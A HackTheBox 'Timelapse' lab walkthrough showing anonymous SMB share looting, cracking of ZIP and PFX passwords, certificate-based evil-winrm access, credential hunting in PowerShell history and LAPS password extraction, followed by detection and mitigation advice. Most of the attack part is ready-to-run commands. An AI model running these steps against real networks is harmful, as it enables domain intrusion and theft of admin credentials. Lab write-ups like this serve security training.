# Timelapse (HackTheBox) — Constrained Delegation & Certificate Exploitation

A practical walkthrough of HTB's Timelapse box, focusing on certificate extraction, constrained delegation with protocol transition, and LAPS password enumeration.

---

## Reconnaissance

### Network Scanning

No HTTP server detected. Focus on SMB enumeration.

**Finding:** Domain = `timelapse.htb`, DC01 with SMB signing enabled

---

## Initial Access: Anonymous SMB Share Enumeration

### Share Discovery

**NetExec SMB enumeration (anonymous access):**
```bash
nxc smb 10.129.227.113 -u anonymous -p "" --shares
```

**Accessible Shares:**
```
IPC$      READ     Remote IPC
Shares    READ     (custom share with sensitive files)
NETLOGON           Logon server share
SYSVOL             Logon server share
```

### Recursive Share Enumeration

**Spider shares for all files:**
```bash
nxc smb 10.129.227.113 -u anonymous -p "" -M spider_plus -o DOWNLOAD_FLAG=True -o OUTPUT_FOLDER=.
```

**Files Found:**
```
Shares/Dev/winrm_backup.zip          (2.55 KB) ← Encrypted backup
Shares/HelpDesk/LAPS.x64.msi         (1.07 MB)
Shares/HelpDesk/LAPS_Datasheet.docx  (101.97 KB)
Shares/HelpDesk/LAPS_OperationsGuide.docx (626.35 KB)
Shares/HelpDesk/LAPS_TechnicalSpecification.docx (70.98 KB)
```

**Key Finding:** `winrm_backup.zip` contains what appears to be a certificate backup.

### Download Encrypted Archive

```bash
nxc smb 10.129.227.113 -u anonymous -p "" --share Shares --get-file "Dev/winrm_backup.zip" ./winrm_backup.zip
```

---

## Certificate Extraction & Password Cracking

### ZIP File Password Cracking

**Extract hash from encrypted ZIP:**
```bash
zip2john winrm_backup.zip > hash.txt
```

**Crack with John the Ripper:**
```bash
john --wordlist=rockyou.txt hash.txt
```

**Result:**
```
supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx)
```

**Extract the PFX file:**
```bash
unzip winrm_backup.zip
Archive password: supremelegacy
```

### PFX Certificate Password Cracking

**Extract hash from PFX:**
```bash
pfx2john legacyy_dev_auth.pfx > privkeyhash.txt
```

**Note:** The `pfx2john` output may contain Python byte string artifacts (b' prefix, trailing '). These need to be cleaned before John can process the hash. Edit manually or use a script to remove Python formatting.

**Crack PFX password:**
```bash
john --wordlist=rockyou.txt privkeyhash.txt
```

**Result:**
```
thuglegacy (legacyy_dev_auth.pfx)
```

### Extract Certificate & Private Key

**Use OpenSSL to extract components (required for evil-winrm SSL connection):**

**Extract private key:**
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out timelapse_private.key -nodes
Enter Import Password: thuglegacy
```

**Extract certificate:**
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out timelapse_cert.crt -nodes
Enter Import Password: thuglegacy
```

---

## WinRM Access via Certificate Authentication

### Certificate-Based WinRM Connection

**evil-winrm with SSL (-S) and certificate/key authentication:**
```bash
./evil-winrm.rb -i 10.129.227.113 -S -c timelapse_cert.crt -k timelapse_private.key
```

**Result:** Interactive PowerShell session as user `legacyy`

---

## Post-Exploitation Enumeration

### PowerShell History

PowerShell v5 (Windows 10+) automatically saves command history. Check:
```powershell
cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Finding:** Additional credentials for another user discovered in history

### User & Group Enumeration

**List local users:**
```powershell
Get-LocalUser
```

**Enumerated Users:**
```
Administrator, Guest, krbtgt, thecybergeek, payl0ad, legacyy, sinfulz, babywyrm, svc_deploy, TRX, DC01$, DB01$, WEB01$
```

**Check group memberships for service accounts:**
```powershell
net user svc_deploy
```

**Finding:**
```
Global Group memberships: *LAPS_Readers, *Domain Users
Local Group Memberships: *Remote Management Users
```

**Key Insight:** `svc_deploy` is in the `LAPS_Readers` group—can read LAPS passwords.

---

## LAPS Password Extraction

### What is LAPS?

Local Administrator Password Solution (LAPS) is a Microsoft tool that automatically manages local administrator account passwords on domain-joined computers.

**AD Attributes:**
- `ms-Mcs-AdmPwd` — Stores the local admin password in clear text (to authorized users)
- `ms-Mcs-AdmPwdExpirationTime` — Stores password expiration timestamp

### Enumerate LAPS Passwords

**PowerShell command (must be executed as user with LAPS read permissions):**
```powershell
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name, ms-Mcs-AdmPwd
```

**Result:** Retrieves clear-text local administrator passwords for all domain-joined computers.

---

## Key Learnings

### Attack Chain Summary

1. **Anonymous SMB Access** — Found writable/readable shares without credentials
2. **Archive Discovery** — Located encrypted certificate backup in share
3. **Multi-Layer Extraction** — ZIP password → PFX password → certificate + private key
4. **Certificate Authentication** — Used extracted certs for WinRM access
5. **Enumeration** — Discovered service account in LAPS_Readers group
6. **LAPS Exploitation** — Extracted local admin passwords via LAPS queries

### Why This Works

- **Anonymous SMB:** Default domain configuration allows guest/anonymous read access to certain shares
- **Weak Encryption:** Archive and certificate passwords crackable via wordlist attacks
- **Certificate Reuse:** Certificates often long-lived; compromised ones grant persistent access
- **LAPS Misconfiguration:** Service accounts granted read access to LAPS passwords (should be restricted to admins only)
- **Constrained Delegation:** (If present) Service account can delegate to other services

### Blue Team Perspective

**Detection Points:**
- Anonymous SMB enumeration and file downloads
- ZIP/PFX password cracking attempts
- Certificate-based WinRM authentication from unusual sources
- PowerShell history access
- LAPS password queries

**Mitigation:**
- Restrict anonymous SMB access (null sessions)
- Encrypt sensitive backups with strong passwords
- Rotate and revoke compromised certificates
- Limit LAPS_Readers group membership to admins only
- Monitor and alert on certificate-based authentication
- Disable PowerShell history or restrict access

---

## Tools Summary

| Tool | Purpose | Status |
|:---|:---|:---|
| **nmap** | Network reconnaissance | ✅ Native |
| **NetExec (nxc)** | SMB enumeration & spider_plus module | ✅ Standalone Python |
| **zip2john** | Extract ZIP archive password hash | ✅ JtR component |
| **pfx2john** | Extract PFX certificate password hash | ✅ JtR component |
| **John the Ripper** | Hash cracking (ZIP, PFX formats) | ✅ Native |
| **OpenSSL** | Certificate extraction & conversion | ✅ Native |
| **evil-winrm** | WinRM shell with certificate auth | ✅ Standalone Ruby |
| **PowerShell** | Native Windows enumeration | ✅ Native |

---

## References

- [John the Ripper Cheatsheet](https://akhil.sh/tutorials/cheatsheets/john_the_ripper_cs/)
- [JtR Format Converters Documentation](https://www.openwall.com/john/doc/)
- [OpenSSL PKCS12 Documentation](https://www.openssl.org/docs/manmaster/man1/pkcs12.html)
- [Microsoft LAPS Documentation](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [PowerShell History File (0xdf)](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html)
- [LAPS GitHub Repository](https://github.com/ztrhgf/LAPS)
- [Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)
